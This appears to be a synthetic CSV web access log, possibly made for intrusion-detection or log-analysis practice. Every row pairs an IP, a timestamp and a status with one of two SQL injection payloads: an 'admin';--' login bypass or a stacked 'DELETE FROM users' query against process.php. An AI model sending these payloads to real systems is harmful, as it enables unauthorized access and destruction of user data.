IP,Time,URL,Status
82.234.147.138,2023-04-04 14:11:08,GET /login.php?user=admin';--,302
214.214.246.126,2023-10-12 07:55:16,GET /login.php?user=admin';--,200
40.35.69.134,2023-06-14 18:06:00,GET /login.php?user=admin';--,302
19.216.147.114,2023-07-09 11:14:28,POST /process.php?id=1; DELETE FROM users;--,302
62.228.136.96,2023-03-31 02:35:15,GET /login.php?user=admin';--,302
190.241.24.82,2023-11-05 03:25:42,POST /process.php?id=1; DELETE FROM users;--,200
161.42.238.4,2023-11-24 16:47:18,POST /process.php?id=1; DELETE FROM users;--,404
44.139.75.54,2023-03-03 12:33:17,GET /login.php?user=admin';--,404
114.3.63.57,2023-09-14 16:19:15,GET /login.php?user=admin';--,404
138.117.224.133,2023-01-12 15:55:16,GET /login.php?user=admin';--,404
66.129.126.136,2023-09-06 18:28:40,GET /login.php?user=admin';--,200
54.60.22.129,2023-02-14 17:59:57,POST /process.php?id=1; DELETE FROM users;--,200
40.226.232.220,2023-04-22 00:02:55,GET /login.php?user=admin';--,302
204.21.25.13,2023-01-22 20:52:44,POST /process.php?id=1; DELETE FROM users;--,302
126.5.198.134,2023-08-09 23:10:29,POST /process.php?id=1; DELETE FROM users;--,404
216.65.106.134,2023-01-25 23:12:39,POST /process.php?id=1; DELETE FROM users;--,200
114.61.95.213,2023-06-28 20:51:08,GET /login.php?user=admin';--,302
71.197.221.138,2023-09-19 02:10:41,POST /process.php?id=1; DELETE FROM users;--,200
77.44.123.152,2023-07-24 19:59:07,POST /process.php?id=1; DELETE FROM users;--,200
207.206.249.188,2023-11-26 10:41:51,GET /login.php?user=admin';--,404
89.76.164.88,2023-03-07 11:03:11,POST /process.php?id=1; DELETE FROM users;--,200
7.42.158.162,2023-09-28 10:01:31,GET /login.php?user=admin';--,200
24.187.89.130,2023-09-18 15:13:47,POST /process.php?id=1; DELETE FROM users;--,200
45.7.173.179,2023-01-20 15:13:38,GET /login.php?user=admin';--,302
194.48.138.201,2023-03-07 10:17:50,GET /login.php?user=admin';--,302
2.144.227.197,2023-11-01 00:38:30,GET /login.php?user=admin';--,302
41.122.2.3,2023-03-04 16:34:26,GET /login.php?user=admin';--,404
166.236.77.153,2023-01-04 22:42:43,POST /process.php?id=1; DELETE FROM users;--,404
211.210.159.219,2023-03-25 02:06:57,GET /login.php?user=admin';--,200
202.89.136.94,2023-09-03 19:15:19,GET /login.php?user=admin';--,404
49.142.217.121,2023-08-15 14:23:10,GET /login.php?user=admin';--,302
94.117.254.47,2023-02-26 11:58:56,GET /login.php?user=admin';--,200
12.89.129.24,2023-10-16 11:17:41,POST /process.php?id=1; DELETE FROM users;--,302
78.228.93.50,2023-05-15 05:38:26,GET /login.php?user=admin';--,200
112.189.244.198,2023-05-13 22:58:36,POST /process.php?id=1; DELETE FROM users;--,200
6.152.1.204,2023-01-23 23:15:27,POST /process.php?id=1; DELETE FROM users;--,302
33.251.33.50,2023-10-30 02:38:45,GET /login.php?user=admin';--,404
131.90.167.7,2023-05-22 04:40:20,GET /login.php?user=admin';--,200
91.189.227.90,2023-01-23 04:47:13,GET /login.php?user=admin';--,302
86.111.123.231,2023-07-12 07:43:18,POST /process.php?id=1; DELETE FROM users;--,302
148.123.61.19,2023-08-15 01:53:38,GET /login.php?user=admin';--,200
66.186.191.102,2023-06-09 13:46:57,GET /login.php?user=admin';--,302
153.44.252.191,2023-10-25 10:43:11,POST /process.php?id=1; DELETE FROM users;--,404
80.132.249.229,2023-02-15 17:44:36,GET /login.php?user=admin';--,404
60.103.245.183,2023-04-16 10:21:42,GET /login.php?user=admin';--,302
191.77.202.42,2023-07-10 13:54:34,GET /login.php?user=admin';--,200
165.222.201.47,2023-01-21 18:54:56,POST /process.php?id=1; DELETE FROM users;--,200
145.180.140.59,2023-07-06 05:14:52,POST /process.php?id=1; DELETE FROM users;--,302
179.59.11.124,2023-03-15 02:27:59,POST /process.php?id=1; DELETE FROM users;--,200
173.81.180.61,2023-03-11 19:54:56,GET /login.php?user=admin';--,302
117.152.94.30,2023-04-08 08:20:05,POST /process.php?id=1; DELETE FROM users;--,404
15.186.182.250,2023-03-14 00:32:43,POST /process.php?id=1; DELETE FROM users;--,302
174.79.30.53,2023-04-17 12:05:46,POST /process.php?id=1; DELETE FROM users;--,200
157.169.237.82,2023-05-12 16:24:58,POST /process.php?id=1; DELETE FROM users;--,302
120.70.124.17,2023-09-13 00:10:45,POST /process.php?id=1; DELETE FROM users;--,302
112.92.98.53,2023-03-05 19:49:05,POST /process.php?id=1; DELETE FROM users;--,404
101.7.167.219,2023-09-27 07:18:07,POST /process.php?id=1; DELETE FROM users;--,200
109.204.227.21,2023-05-07 07:22:16,GET /login.php?user=admin';--,200
170.46.16.43,2023-09-13 18:18:22,POST /process.php?id=1; DELETE FROM users;--,302
90.165.153.118,2023-06-29 00:58:39,POST /process.php?id=1; DELETE FROM users;--,302
31.137.254.219,2023-01-10 19:10:39,GET /login.php?user=admin';--,404
207.20.164.184,2023-09-09 23:12:04,GET /login.php?user=admin';--,200
16.32.75.29,2023-09-19 22:12:24,POST /process.php?id=1; DELETE FROM users;--,302
64.110.210.203,2023-11-12 16:02:12,POST /process.php?id=1; DELETE FROM users;--,200
112.101.209.135,2023-07-02 16:05:15,GET /login.php?user=admin';--,200
118.6.78.35,2023-06-03 04:02:50,GET /login.php?user=admin';--,404
34.149.72.45,2023-03-28 23:52:28,POST /process.php?id=1; DELETE FROM users;--,302
55.99.241.135,2023-05-23 12:46:38,GET /login.php?user=admin';--,200
103.239.179.191,2023-04-22 14:40:19,POST /process.php?id=1; DELETE FROM users;--,200
205.188.199.203,2023-09-28 11:10:29,GET /login.php?user=admin';--,302
128.20.206.207,2023-10-16 20:31:51,GET /login.php?user=admin';--,404
39.186.44.2,2023-10-31 18:10:24,POST /process.php?id=1; DELETE FROM users;--,404
39.229.152.54,2023-02-26 13:07:02,POST /process.php?id=1; DELETE FROM users;--,404
94.215.205.37,2023-08-12 23:30:19,GET /login.php?user=admin';--,404
57.168.20.110,2023-01-12 15:24:26,GET /login.php?user=admin';--,200
144.86.219.5,2023-06-29 10:21:16,POST /process.php?id=1; DELETE FROM users;--,404
96.40.111.128,2023-01-19 04:25:16,POST /process.php?id=1; DELETE FROM users;--,404
139.253.25.240,2023-04-27 03:07:45,POST /process.php?id=1; DELETE FROM users;--,404
220.189.210.131,2023-01-10 12:52:14,GET /login.php?user=admin';--,200
122.244.157.215,2023-02-25 05:20:17,POST /process.php?id=1; DELETE FROM users;--,302
146.168.5.151,2023-04-25 04:57:08,POST /process.php?id=1; DELETE FROM users;--,302
82.38.66.183,2023-08-04 02:01:30,POST /process.php?id=1; DELETE FROM users;--,200
16.232.104.89,2023-10-07 03:45:33,GET /login.php?user=admin';--,302
220.148.118.254,2023-09-07 21:13:43,POST /process.php?id=1; DELETE FROM users;--,200
22.230.52.212,2023-01-22 07:22:29,POST /process.php?id=1; DELETE FROM users;--,404
31.130.29.100,2023-05-03 20:28:44,POST /process.php?id=1; DELETE FROM users;--,200
75.126.50.226,2023-08-20 02:49:46,GET /login.php?user=admin';--,200
192.247.164.19,2023-11-21 14:26:00,POST /process.php?id=1; DELETE FROM users;--,404
186.23.198.71,2023-09-07 21:44:54,GET /login.php?user=admin';--,200
165.252.36.59,2023-10-25 13:03:24,GET /login.php?user=admin';--,200
147.137.187.7,2023-11-21 09:40:04,POST /process.php?id=1; DELETE FROM users;--,404
167.49.58.37,2023-10-09 22:53:53,POST /process.php?id=1; DELETE FROM users;--,302
59.204.96.89,2023-01-24 08:48:58,GET /login.php?user=admin';--,404
88.117.18.168,2023-04-14 05:50:10,GET /login.php?user=admin';--,200
4.85.176.42,2023-03-16 22:45:14,GET /login.php?user=admin';--,200
152.216.34.57,2023-06-04 22:44:34,POST /process.php?id=1; DELETE FROM users;--,200
144.44.43.208,2023-06-23 17:16:34,POST /process.php?id=1; DELETE FROM users;--,404
146.124.183.153,2023-01-25 10:43:19,GET /login.php?user=admin';--,404
108.194.233.62,2023-01-19 03:44:37,GET /login.php?user=admin';--,302
83.210.249.230,2023-05-13 22:25:04,POST /process.php?id=1; DELETE FROM users;--,200
63.148.20.104,2023-01-31 11:22:36,POST /process.php?id=1; DELETE FROM users;--,302
179.64.212.86,2023-04-25 20:39:17,POST /process.php?id=1; DELETE FROM users;--,302
12.141.187.167,2023-09-08 03:17:13,POST /process.php?id=1; DELETE FROM users;--,200
11.93.55.5,2023-10-17 20:23:52,POST /process.php?id=1; DELETE FROM users;--,200
67.158.255.159,2023-10-12 17:37:50,POST /process.php?id=1; DELETE FROM users;--,404
54.35.161.120,2023-06-29 03:14:21,GET /login.php?user=admin';--,302
93.99.173.244,2023-01-11 10:31:06,POST /process.php?id=1; DELETE FROM users;--,404
57.103.104.153,2023-04-27 23:59:23,GET /login.php?user=admin';--,404
177.160.117.141,2023-05-28 21:29:47,POST /process.php?id=1; DELETE FROM users;--,200
192.202.5.24,2023-05-14 13:45:07,POST /process.php?id=1; DELETE FROM users;--,302
47.78.204.190,2023-04-12 01:15:26,POST /process.php?id=1; DELETE FROM users;--,200
12.4.139.132,2023-05-29 10:30:48,GET /login.php?user=admin';--,200
203.251.4.67,2023-06-24 23:36:33,GET /login.php?user=admin';--,200
208.252.166.98,2023-05-26 11:15:28,POST /process.php?id=1; DELETE FROM users;--,200
157.105.184.246,2023-03-19 01:20:53,POST /process.php?id=1; DELETE FROM users;--,302
98.133.38.209,2023-05-09 04:50:07,POST /process.php?id=1; DELETE FROM users;--,302
74.242.138.73,2023-05-25 03:09:36,POST /process.php?id=1; DELETE FROM users;--,302
140.9.81.114,2023-02-01 03:33:59,GET /login.php?user=admin';--,404
162.0.35.2,2023-07-27 04:58:03,POST /process.php?id=1; DELETE FROM users;--,302
58.233.219.233,2023-03-09 10:57:10,GET /login.php?user=admin';--,200
179.232.202.192,2023-09-02 16:56:38,GET /login.php?user=admin';--,302
37.138.62.179,2023-05-01 01:59:47,GET /login.php?user=admin';--,200
120.113.214.28,2023-04-06 22:49:58,GET /login.php?user=admin';--,302
34.168.122.136,2023-07-17 19:08:39,GET /login.php?user=admin';--,404
210.49.66.182,2023-01-18 11:07:19,POST /process.php?id=1; DELETE FROM users;--,404
155.234.156.95,2023-10-14 22:16:41,POST /process.php?id=1; DELETE FROM users;--,404
17.82.243.22,2023-03-18 19:19:49,POST /process.php?id=1; DELETE FROM users;--,200
122.63.116.219,2023-07-02 19:29:23,POST /process.php?id=1; DELETE FROM users;--,404
174.25.151.175,2023-04-24 01:49:45,GET /login.php?user=admin';--,200
11.43.138.82,2023-11-02 03:58:57,POST /process.php?id=1; DELETE FROM users;--,302
207.75.3.20,2023-11-25 15:19:07,GET /login.php?user=admin';--,404
188.33.182.51,2023-06-06 14:12:55,GET /login.php?user=admin';--,200
72.35.251.132,2023-03-22 21:20:27,POST /process.php?id=1; DELETE FROM users;--,404
17.226.48.107,2023-10-31 15:01:03,POST /process.php?id=1; DELETE FROM users;--,404
51.167.33.76,2023-03-03 05:07:49,POST /process.php?id=1; DELETE FROM users;--,200
47.163.15.182,2023-01-14 00:25:20,GET /login.php?user=admin';--,200
100.202.43.183,2023-01-15 09:05:09,GET /login.php?user=admin';--,200
32.6.37.7,2023-03-09 02:10:26,POST /process.php?id=1; DELETE FROM users;--,200
217.69.17.124,2023-04-06 22:29:30,GET /login.php?user=admin';--,200
214.214.165.149,2023-10-12 07:28:27,POST /process.php?id=1; DELETE FROM users;--,200
26.196.64.164,2023-05-21 17:22:35,GET /login.php?user=admin';--,404
209.167.39.192,2023-08-13 10:52:42,POST /process.php?id=1; DELETE FROM users;--,404
146.212.199.126,2023-06-26 15:50:19,POST /process.php?id=1; DELETE FROM users;--,302
182.195.86.39,2023-10-17 21:47:00,POST /process.php?id=1; DELETE FROM users;--,200
129.197.149.146,2023-06-30 18:10:33,GET /login.php?user=admin';--,200
93.13.144.115,2023-04-08 13:26:27,GET /login.php?user=admin';--,200
222.213.183.128,2023-02-07 17:22:05,GET /login.php?user=admin';--,302
167.229.237.230,2023-08-03 04:07:31,POST /process.php?id=1; DELETE FROM users;--,404
129.46.206.56,2023-06-23 09:00:35,GET /login.php?user=admin';--,302
222.41.94.109,2023-10-31 04:40:40,GET /login.php?user=admin';--,302
161.207.141.65,2023-05-15 22:39:41,GET /login.php?user=admin';--,302
88.41.4.39,2023-02-28 09:44:58,GET /login.php?user=admin';--,200
157.3.96.114,2023-08-21 11:48:43,POST /process.php?id=1; DELETE FROM users;--,404
25.47.1.190,2023-06-14 17:19:55,POST /process.php?id=1; DELETE FROM users;--,200
222.167.136.188,2023-11-11 09:12:05,POST /process.php?id=1; DELETE FROM users;--,404
63.185.39.248,2023-06-19 02:45:13,GET /login.php?user=admin';--,302
220.81.240.26,2023-01-30 06:42:09,GET /login.php?user=admin';--,404
67.148.225.12,2023-03-04 08:56:26,GET /login.php?user=admin';--,404
81.138.87.77,2023-04-22 18:18:40,GET /login.php?user=admin';--,302
74.213.23.196,2023-06-19 19:57:01,GET /login.php?user=admin';--,302
62.3.131.155,2023-11-10 16:16:56,POST /process.php?id=1; DELETE FROM users;--,302
170.144.181.213,2023-08-21 00:44:28,GET /login.php?user=admin';--,404
122.205.67.155,2023-09-28 02:22:01,POST /process.php?id=1; DELETE FROM users;--,302
62.192.86.174,2023-10-05 00:41:35,POST /process.php?id=1; DELETE FROM users;--,302
16.180.80.22,2023-08-12 12:24:55,GET /login.php?user=admin';--,302
75.35.55.221,2023-02-23 16:55:25,POST /process.php?id=1; DELETE FROM users;--,302
50.55.97.7,2023-02-28 19:48:09,POST /process.php?id=1; DELETE FROM users;--,404
156.60.174.212,2023-11-28 07:05:15,GET /login.php?user=admin';--,200
223.214.178.83,2023-09-07 05:44:56,POST /process.php?id=1; DELETE FROM users;--,200
116.127.189.237,2023-10-21 07:40:55,GET /login.php?user=admin';--,302
147.88.195.182,2023-04-19 14:16:16,POST /process.php?id=1; DELETE FROM users;--,404
184.135.116.149,2023-08-13 09:58:43,POST /process.php?id=1; DELETE FROM users;--,200
197.98.154.150,2023-07-10 11:56:52,GET /login.php?user=admin';--,200
49.75.69.234,2023-10-30 18:09:02,POST /process.php?id=1; DELETE FROM users;--,302
118.248.152.145,2023-10-23 22:35:08,POST /process.php?id=1; DELETE FROM users;--,200
35.88.137.107,2023-07-20 11:07:17,POST /process.php?id=1; DELETE FROM users;--,404
85.123.114.192,2023-01-22 06:40:46,GET /login.php?user=admin';--,302
72.43.250.128,2023-09-13 14:59:20,GET /login.php?user=admin';--,200
214.178.0.63,2023-01-14 20:47:19,GET /login.php?user=admin';--,200
27.102.168.231,2023-09-13 07:34:19,GET /login.php?user=admin';--,404
28.21.234.226,2023-08-01 04:12:15,POST /process.php?id=1; DELETE FROM users;--,404
22.9.55.135,2023-05-17 07:39:02,POST /process.php?id=1; DELETE FROM users;--,404
133.159.5.95,2023-10-25 12:56:40,GET /login.php?user=admin';--,200
194.187.139.86,2023-11-12 20:50:24,GET /login.php?user=admin';--,404
22.236.51.199,2023-03-13 01:02:29,GET /login.php?user=admin';--,404
76.147.190.20,2023-11-28 17:51:51,GET /login.php?user=admin';--,404
185.56.222.95,2023-03-30 19:54:54,POST /process.php?id=1; DELETE FROM users;--,200
190.32.173.79,2023-01-28 23:16:46,POST /process.php?id=1; DELETE FROM users;--,404
1.6.40.69,2023-08-05 16:17:43,GET /login.php?user=admin';--,200
97.226.36.242,2023-04-12 08:52:50,GET /login.php?user=admin';--,302
175.10.62.61,2023-05-26 08:03:11,POST /process.php?id=1; DELETE FROM users;--,302
122.19.12.40,2023-11-25 06:16:36,GET /login.php?user=admin';--,200
204.167.64.95,2023-03-07 16:25:17,POST /process.php?id=1; DELETE FROM users;--,302
182.54.111.78,2023-03-14 05:16:19,GET /login.php?user=admin';--,302
131.155.203.86,2023-05-05 07:02:38,GET /login.php?user=admin';--,302
148.182.84.121,2023-05-11 11:29:38,POST /process.php?id=1; DELETE FROM users;--,302
92.217.241.19,2023-02-22 22:07:36,POST /process.php?id=1; DELETE FROM users;--,200
31.51.73.153,2023-02-01 07:53:36,POST /process.php?id=1; DELETE FROM users;--,404
82.240.184.129,2023-06-25 18:08:10,POST /process.php?id=1; DELETE FROM users;--,200
202.84.35.15,2023-09-08 19:40:37,POST /process.php?id=1; DELETE FROM users;--,200
84.29.253.116,2023-05-22 19:35:43,POST /process.php?id=1; DELETE FROM users;--,200
113.197.238.18,2023-02-07 09:43:20,GET /login.php?user=admin';--,404
26.86.116.127,2023-01-28 18:21:25,POST /process.php?id=1; DELETE FROM users;--,404
66.209.222.203,2023-09-08 18:37:56,POST /process.php?id=1; DELETE FROM users;--,200
107.120.36.138,2023-03-26 11:14:17,GET /login.php?user=admin';--,200
209.250.142.217,2023-02-25 18:27:17,POST /process.php?id=1; DELETE FROM users;--,302
157.228.37.5,2023-05-29 07:06:19,POST /process.php?id=1; DELETE FROM users;--,302
56.103.189.116,2023-02-05 19:14:43,GET /login.php?user=admin';--,302
166.2.212.214,2023-02-28 11:32:18,GET /login.php?user=admin';--,302
189.75.6.96,2023-06-20 06:32:08,GET /login.php?user=admin';--,302
197.108.86.21,2023-03-09 10:31:16,GET /login.php?user=admin';--,200
76.58.179.202,2023-09-11 18:18:30,POST /process.php?id=1; DELETE FROM users;--,404
105.75.146.101,2023-09-13 10:21:02,GET /login.php?user=admin';--,200
97.121.212.109,2023-10-14 08:24:13,POST /process.php?id=1; DELETE FROM users;--,200
89.20.205.105,2023-11-05 06:33:23,GET /login.php?user=admin';--,200
98.154.217.40,2023-03-18 21:00:14,POST /process.php?id=1; DELETE FROM users;--,200
213.255.2.249,2023-05-22 04:11:53,GET /login.php?user=admin';--,200
119.119.169.174,2023-07-01 08:15:40,POST /process.php?id=1; DELETE FROM users;--,404
55.196.237.208,2023-10-02 01:05:56,GET /login.php?user=admin';--,302
208.142.219.21,2023-07-24 22:28:05,GET /login.php?user=admin';--,200
106.20.236.120,2023-09-28 20:28:55,POST /process.php?id=1; DELETE FROM users;--,200
175.51.164.172,2023-04-11 17:22:48,GET /login.php?user=admin';--,200
179.249.177.50,2023-05-21 04:42:59,POST /process.php?id=1; DELETE FROM users;--,404
123.240.152.57,2023-09-21 11:11:13,POST /process.php?id=1; DELETE FROM users;--,404
86.10.99.40,2023-08-11 09:44:05,GET /login.php?user=admin';--,200
189.56.14.68,2023-07-31 15:14:59,POST /process.php?id=1; DELETE FROM users;--,200
92.38.117.156,2023-03-01 22:44:16,GET /login.php?user=admin';--,200
198.162.148.254,2023-06-09 06:04:11,POST /process.php?id=1; DELETE FROM users;--,302
63.74.72.126,2023-09-02 20:09:28,GET /login.php?user=admin';--,302
134.240.113.220,2023-04-17 07:52:57,POST /process.php?id=1; DELETE FROM users;--,404
169.86.132.131,2023-03-24 13:17:01,POST /process.php?id=1; DELETE FROM users;--,302
167.29.144.141,2023-11-02 22:22:11,GET /login.php?user=admin';--,200
196.163.60.29,2023-11-09 22:55:08,POST /process.php?id=1; DELETE FROM users;--,404
135.176.68.59,2023-08-23 00:40:58,GET /login.php?user=admin';--,200
138.117.51.8,2023-03-06 11:58:01,GET /login.php?user=admin';--,200
145.47.42.194,2023-07-04 12:33:13,POST /process.php?id=1; DELETE FROM users;--,200
96.208.129.78,2023-03-15 13:16:34,POST /process.php?id=1; DELETE FROM users;--,404
111.109.36.128,2023-06-25 17:38:22,GET /login.php?user=admin';--,302
64.94.120.2,2023-06-09 06:17:29,POST /process.php?id=1; DELETE FROM users;--,200
108.3.193.151,2023-10-31 15:23:21,POST /process.php?id=1; DELETE FROM users;--,302
121.18.147.126,2023-05-14 06:54:37,POST /process.php?id=1; DELETE FROM users;--,302
129.53.6.94,2023-06-08 07:46:14,POST /process.php?id=1; DELETE FROM users;--,200
178.233.245.227,2023-07-08 14:26:46,POST /process.php?id=1; DELETE FROM users;--,200
21.234.194.207,2023-07-24 18:50:50,POST /process.php?id=1; DELETE FROM users;--,200
190.9.59.2,2023-01-27 04:55:05,GET /login.php?user=admin';--,200
182.73.159.203,2023-03-05 21:08:08,POST /process.php?id=1; DELETE FROM users;--,302
195.131.114.203,2023-09-30 06:26:04,POST /process.php?id=1; DELETE FROM users;--,404
220.95.107.11,2023-07-17 00:38:33,GET /login.php?user=admin';--,200
63.87.213.108,2023-05-15 21:28:41,GET /login.php?user=admin';--,200
65.219.118.184,2023-03-10 05:37:51,GET /login.php?user=admin';--,302
47.168.61.86,2023-11-11 06:28:58,GET /login.php?user=admin';--,404
11.191.85.242,2023-06-15 06:21:32,GET /login.php?user=admin';--,404
11.202.150.177,2023-03-28 23:21:18,POST /process.php?id=1; DELETE FROM users;--,302
26.81.85.4,2023-01-20 09:17:40,POST /process.php?id=1; DELETE FROM users;--,302
101.159.99.68,2023-07-01 15:22:17,POST /process.php?id=1; DELETE FROM users;--,302
147.1.110.12,2023-05-09 02:47:18,POST /process.php?id=1; DELETE FROM users;--,200
71.48.81.91,2023-09-21 19:37:05,GET /login.php?user=admin';--,302
68.237.28.158,2023-09-22 02:43:06,GET /login.php?user=admin';--,302
42.246.74.136,2023-03-02 05:47:38,POST /process.php?id=1; DELETE FROM users;--,200
190.192.132.63,2023-04-29 21:04:14,POST /process.php?id=1; DELETE FROM users;--,404
115.252.218.133,2023-07-12 12:06:20,GET /login.php?user=admin';--,200
101.185.78.217,2023-04-16 15:38:20,GET /login.php?user=admin';--,404
38.185.102.160,2023-08-14 09:01:42,GET /login.php?user=admin';--,200
156.116.78.49,2023-10-18 01:05:52,POST /process.php?id=1; DELETE FROM users;--,200
115.34.64.212,2023-08-18 04:18:47,POST /process.php?id=1; DELETE FROM users;--,404
131.63.231.148,2023-09-15 17:47:10,POST /process.php?id=1; DELETE FROM users;--,200
95.57.244.255,2023-04-27 07:42:34,GET /login.php?user=admin';--,404
198.219.92.169,2023-05-30 12:17:01,GET /login.php?user=admin';--,404
100.10.25.213,2023-05-16 21:29:36,GET /login.php?user=admin';--,200
210.110.25.240,2023-09-27 06:38:00,GET /login.php?user=admin';--,302
113.162.11.65,2023-05-12 07:18:21,GET /login.php?user=admin';--,302
62.145.185.230,2023-01-03 12:00:44,GET /login.php?user=admin';--,200
4.148.142.36,2023-06-16 19:10:51,GET /login.php?user=admin';--,200
187.33.132.186,2023-07-09 14:35:27,GET /login.php?user=admin';--,302
9.108.108.134,2023-11-08 07:06:52,POST /process.php?id=1; DELETE FROM users;--,302
166.70.230.100,2023-01-11 00:22:33,POST /process.php?id=1; DELETE FROM users;--,200
137.143.135.200,2023-07-26 15:14:08,POST /process.php?id=1; DELETE FROM users;--,404
117.184.19.166,2023-03-17 09:29:42,GET /login.php?user=admin';--,200
66.242.16.26,2023-02-18 02:38:02,POST /process.php?id=1; DELETE FROM users;--,200
160.213.134.179,2023-02-27 11:23:30,GET /login.php?user=admin';--,302
96.142.228.88,2023-10-12 08:48:06,GET /login.php?user=admin';--,302
103.105.220.204,2023-04-08 23:51:58,GET /login.php?user=admin';--,302
44.82.90.204,2023-11-05 00:34:38,GET /login.php?user=admin';--,404
183.224.68.38,2023-04-22 01:09:01,POST /process.php?id=1; DELETE FROM users;--,404
34.111.137.1,2023-02-23 01:06:49,GET /login.php?user=admin';--,404
145.19.170.124,2023-03-27 02:51:35,POST /process.php?id=1; DELETE FROM users;--,302
110.120.113.33,2023-05-17 19:23:06,POST /process.php?id=1; DELETE FROM users;--,302
41.133.163.52,2023-06-11 01:39:44,POST /process.php?id=1; DELETE FROM users;--,404
51.194.122.188,2023-03-10 16:06:17,POST /process.php?id=1; DELETE FROM users;--,200
74.62.201.150,2023-10-10 11:35:50,POST /process.php?id=1; DELETE FROM users;--,404
26.179.83.213,2023-10-03 16:56:01,GET /login.php?user=admin';--,302
143.143.20.1,2023-10-29 15:12:42,GET /login.php?user=admin';--,200
205.215.199.215,2023-02-22 18:49:42,GET /login.php?user=admin';--,200
130.148.190.161,2023-08-17 09:24:06,POST /process.php?id=1; DELETE FROM users;--,200
111.124.177.194,2023-03-22 02:12:47,POST /process.php?id=1; DELETE FROM users;--,302
140.116.245.106,2023-07-09 00:57:18,POST /process.php?id=1; DELETE FROM users;--,404
194.123.167.69,2023-04-06 22:36:22,GET /login.php?user=admin';--,200
42.117.230.71,2023-04-14 03:56:59,POST /process.php?id=1; DELETE FROM users;--,404
159.242.147.15,2023-05-26 17:11:43,GET /login.php?user=admin';--,200
17.84.75.132,2023-11-12 05:16:59,GET /login.php?user=admin';--,200
3.13.166.145,2023-06-08 23:04:04,GET /login.php?user=admin';--,302
211.77.232.233,2023-09-30 11:53:52,POST /process.php?id=1; DELETE FROM users;--,404
157.144.84.232,2023-08-03 18:08:50,POST /process.php?id=1; DELETE FROM users;--,404
153.58.206.46,2023-01-01 21:28:27,GET /login.php?user=admin';--,200
137.111.199.80,2023-03-14 18:05:39,POST /process.php?id=1; DELETE FROM users;--,200
147.82.196.29,2023-03-17 13:13:41,POST /process.php?id=1; DELETE FROM users;--,200
24.169.245.199,2023-09-02 20:12:30,GET /login.php?user=admin';--,302
190.64.78.85,2023-03-30 11:43:51,POST /process.php?id=1; DELETE FROM users;--,302
100.19.231.251,2023-07-07 13:41:50,POST /process.php?id=1; DELETE FROM users;--,302
32.1.156.4,2023-11-29 21:51:42,GET /login.php?user=admin';--,404
7.111.80.67,2023-06-11 11:51:40,POST /process.php?id=1; DELETE FROM users;--,302
22.252.102.167,2023-06-01 12:07:31,POST /process.php?id=1; DELETE FROM users;--,302
102.113.150.29,2023-05-12 12:06:01,GET /login.php?user=admin';--,302
208.192.213.153,2023-10-17 00:24:31,POST /process.php?id=1; DELETE FROM users;--,302
55.69.195.150,2023-03-06 21:08:35,POST /process.php?id=1; DELETE FROM users;--,200
49.66.238.138,2023-07-09 02:11:57,GET /login.php?user=admin';--,302
12.188.78.212,2023-05-14 00:44:55,GET /login.php?user=admin';--,302
221.163.31.191,2023-06-03 01:36:10,GET /login.php?user=admin';--,200
188.168.99.217,2023-10-19 22:41:02,POST /process.php?id=1; DELETE FROM users;--,302
63.218.72.94,2023-05-16 15:20:40,GET /login.php?user=admin';--,200
156.139.114.167,2023-05-08 20:46:15,GET /login.php?user=admin';--,200
92.22.153.253,2023-05-22 20:19:51,POST /process.php?id=1; DELETE FROM users;--,200
167.193.236.131,2023-06-23 21:38:02,GET /login.php?user=admin';--,200
77.202.62.80,2023-05-16 07:53:57,GET /login.php?user=admin';--,404
40.83.26.185,2023-02-05 14:12:13,GET /login.php?user=admin';--,302
29.47.22.119,2023-02-18 15:50:58,GET /login.php?user=admin';--,200
37.7.200.147,2023-04-17 17:36:21,GET /login.php?user=admin';--,302
108.207.148.81,2023-08-25 15:26:22,POST /process.php?id=1; DELETE FROM users;--,302
212.85.221.89,2023-10-06 03:44:59,GET /login.php?user=admin';--,200
197.3.119.97,2023-04-24 12:20:16,POST /process.php?id=1; DELETE FROM users;--,404
38.251.25.227,2023-08-15 03:37:22,POST /process.php?id=1; DELETE FROM users;--,200
135.211.30.34,2023-02-28 11:19:04,POST /process.php?id=1; DELETE FROM users;--,200
49.85.188.65,2023-07-08 03:21:28,POST /process.php?id=1; DELETE FROM users;--,200
15.164.240.67,2023-04-21 23:26:59,POST /process.php?id=1; DELETE FROM users;--,200
77.221.43.137,2023-02-14 22:34:54,GET /login.php?user=admin';--,200
55.141.90.39,2023-07-25 14:44:08,GET /login.php?user=admin';--,404
171.79.138.236,2023-02-06 09:00:51,POST /process.php?id=1; DELETE FROM users;--,302
104.157.237.66,2023-03-13 09:42:07,POST /process.php?id=1; DELETE FROM users;--,302
189.86.3.195,2023-07-07 15:21:30,GET /login.php?user=admin';--,200
173.171.236.166,2023-10-20 12:00:04,GET /login.php?user=admin';--,404
103.172.171.108,2023-11-23 04:42:22,POST /process.php?id=1; DELETE FROM users;--,200
55.81.156.71,2023-05-30 00:04:50,POST /process.php?id=1; DELETE FROM users;--,404
82.88.43.101,2023-04-04 11:40:23,GET /login.php?user=admin';--,404
221.81.82.61,2023-03-19 02:15:28,POST /process.php?id=1; DELETE FROM users;--,404
88.199.210.15,2023-09-20 04:51:14,GET /login.php?user=admin';--,302
192.252.94.243,2023-05-16 18:09:38,GET /login.php?user=admin';--,302
45.215.166.127,2023-11-24 05:22:26,GET /login.php?user=admin';--,404
213.190.31.46,2023-07-13 01:39:31,GET /login.php?user=admin';--,404
73.189.243.137,2023-04-20 23:18:26,POST /process.php?id=1; DELETE FROM users;--,200
183.201.145.250,2023-04-02 00:09:21,POST /process.php?id=1; DELETE FROM users;--,200
202.169.3.227,2023-06-15 06:39:04,POST /process.php?id=1; DELETE FROM users;--,200
213.187.64.165,2023-05-18 08:03:55,POST /process.php?id=1; DELETE FROM users;--,200
196.121.44.58,2023-08-08 16:06:08,POST /process.php?id=1; DELETE FROM users;--,302
5.55.184.24,2023-07-16 11:55:07,POST /process.php?id=1; DELETE FROM users;--,404
148.171.51.188,2023-09-01 02:42:36,GET /login.php?user=admin';--,404
36.227.95.104,2023-08-26 20:48:41,GET /login.php?user=admin';--,302
23.33.23.123,2023-10-26 16:15:27,GET /login.php?user=admin';--,302
113.124.221.93,2023-04-12 17:09:34,GET /login.php?user=admin';--,404
64.208.94.26,2023-08-19 14:44:42,GET /login.php?user=admin';--,404
22.24.191.246,2023-08-19 16:44:18,GET /login.php?user=admin';--,302
41.225.57.205,2023-04-24 00:32:12,GET /login.php?user=admin';--,302
129.130.78.86,2023-06-04 09:18:26,GET /login.php?user=admin';--,404
222.30.197.175,2023-03-09 11:15:08,POST /process.php?id=1; DELETE FROM users;--,404
197.78.244.11,2023-09-10 22:18:31,GET /login.php?user=admin';--,200
165.171.110.87,2023-02-08 10:28:41,POST /process.php?id=1; DELETE FROM users;--,404
